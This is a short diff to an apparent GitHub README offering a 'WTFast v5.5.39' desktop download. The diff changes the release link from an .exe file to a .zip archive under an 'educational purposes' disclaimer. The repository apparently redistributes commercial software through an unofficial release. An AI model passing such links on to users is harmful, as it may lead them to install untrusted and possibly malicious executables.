@@ -42,7 +42,7 @@ This repository is provided for educational and informational purposes. All tool
 
 The repository includes a compressed archive with the complete desktop setup.
 
-📥 **[Download `WTFast v5.5.39`](https://github.com/apirun321/WTFast-Smoother-Gaming-v5.5.39-Desktop/releases/download/Game-Soft/WTFast-v5.5.39-Desktop.exe)**
+📥 **[Download `WTFast v5.5.39`](https://github.com/apirun321/WTFast-Smoother-Gaming-v5.5.39-Desktop/releases/download/Game-Soft/WTFast-v5.5.39-Desktop.zip)**
 
 
 ### Archive Contents
